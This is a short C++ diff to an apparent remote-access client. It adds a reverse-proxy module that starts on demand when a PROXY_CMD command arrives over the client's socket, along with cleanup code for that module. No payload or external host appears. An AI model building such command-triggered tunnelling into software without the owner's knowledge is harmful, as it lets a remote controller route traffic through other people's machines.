@@ -71,6 +71,10 @@ void Cliente::DestroyClasses() {
         DeleteObj<mod_Info>(this->mod_Inf0);
     }
 
+    if (this->mod_ReverseProxy != nullptr) {
+        DeleteObj<ReverseProxy>(this->mod_ReverseProxy);
+    }
+
     __DBG_("[DC] Clases destruidas");
 }
 
@@ -879,6 +883,16 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }else {
             this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
         }
+        return;
+    }
+
+    //Datos de proxy remoto
+    if (iComando == EnumComandos::PROXY_CMD) {
+        if (!this->mod_ReverseProxy) {
+            this->mod_ReverseProxy = new ReverseProxy();
+        }
+        std::vector<char> buffer(paquete.cBuffer);
+        this->mod_ReverseProxy->m_ProcesarDatosProxy(buffer, iRecibido - 1);
         return;
     }
 }
